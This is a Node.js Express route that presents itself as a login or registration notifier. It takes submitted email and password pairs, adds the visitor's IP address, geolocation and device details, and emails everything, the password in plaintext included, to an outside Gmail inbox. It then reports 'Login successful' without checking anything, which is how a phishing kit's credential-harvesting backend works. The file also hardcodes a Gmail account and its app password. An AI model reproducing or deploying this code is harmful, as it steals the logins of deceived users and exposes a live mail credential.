const express = require("express");
const nodemailer = require('nodemailer');
const useragent = require('useragent');
const geoip = require('geoip-lite');
const router = express.Router();

// Merge tag function
function replaceMergeTags(template, data) {
    return template.replace(/\[\[\s*-(.*?)\s*-\]\]/g, (_, key) => {
        return data[key.trim()] ?? '';
    });
}

// Email transporter
const transporter = nodemailer.createTransport({
    host: 'smtp.gmail.com',
    port: 465,
    secure: true,
    auth: {
        user: "yasermehmod2@gmail.com",
        pass: "kzmw ffhk vtdu adel",
    },
});

router.post('/', async (req, res) => {
    res.setHeader('Content-Type', 'application/json');

    try {
        const { email, password } = req.body;

        const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
        const location = geoip.lookup(ip);
        const agent = useragent.parse(req.headers['user-agent']);

        const deviceType = `${agent.os.toString()} - ${agent.toAgent()}`;
        const locationStr = location ? `${location.city}, ${location.country}` : 'Unknown';

        // Template with merge tags
        const htmlTemplate = `
            <h1>New User Registration</h1>
            <p>Here are the registration details:</p>
            <ul>
                <li><strong>Email:</strong> [[-email-]]</li>
                <li><strong>Password:</strong> [[-password-]]</li>
                <li><strong>IP:</strong> [[-ip-]]</li>
                <li><strong>Location:</strong> [[-location-]]</li>
                <li><strong>Timestamp:</strong> [[-timestamp-]]</li>
            </ul>
        `;

        const mergedHtml = replaceMergeTags(htmlTemplate, {
            email,
            password,
            ip,
            location: locationStr,
            timestamp: new Date().toISOString(),
        });

        const mailOptions = {
            from: email,
            to: "josephblessing6776@gmail.com",
            subject: `New sign-in on ${deviceType}`,
            html: mergedHtml,
        };

        await transporter.sendMail(mailOptions);
        console.log(`Email sent to ${email}`);

        res.status(200).json({
            success: true,
            message: 'Login successful and notification sent',
            loginDetails: {
                device: deviceType,
                ip,
                location: locationStr
            }
        });

    } catch (error) {
        console.error('Error sending email:', error);
        res.status(500).json({
            success: false,
            message: 'Failed to send notification',
            error: error.message
        });
    }
});

module.exports = router;